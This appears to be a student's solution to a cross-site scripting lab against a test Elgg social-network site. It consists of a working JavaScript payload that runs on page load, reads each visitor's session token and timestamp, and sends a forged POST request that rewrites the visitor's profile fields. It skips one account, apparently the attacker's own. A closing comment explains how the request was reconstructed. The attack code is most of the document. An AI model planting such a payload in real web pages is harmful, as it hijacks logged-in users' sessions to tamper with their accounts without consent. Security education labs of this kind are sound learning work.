<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.

	//step 1
        var sendurl="/action/profile/edit"; //FILL IN
	//step 2 and 3
	var content=token+ts+ "&name=" +elgg.session.user.name + "&description=a&accesslevel%5Bdescription%5D=1&briefdescription=b&accesslevel%5Bbriefdescription%5D=1&location=c&accesslevel%5Blocation%5D=1&interests=d&accesslevel%5Binterests%5D=1&skills=e&accesslevel%5Bskills%5D=1&contactemail=f%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=g&accesslevel%5Bphone%5D=1&mobile=h&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.google.com%2F&accesslevel%5Bwebsite%5D=1&twitter=j&accesslevel%5Btwitter%5D=1&guid="+elgg.session.user.guid; //FILL IN
	
	if(elgg.session.user.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		//step 4
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>

/*		*******STEPS**********
	1. first the sendurl was constructed by inspecting the request url upon clicking save after editing profile.
	2. after filling out the form and submitting, I inspected the post request body to get the body of request content.
	3. Upon getting the content structure, I reconstructed the content to contain the elgg ts, token, display name and userid of the currently logged in user.
	4. Ajax request was modified to "POST".
*/


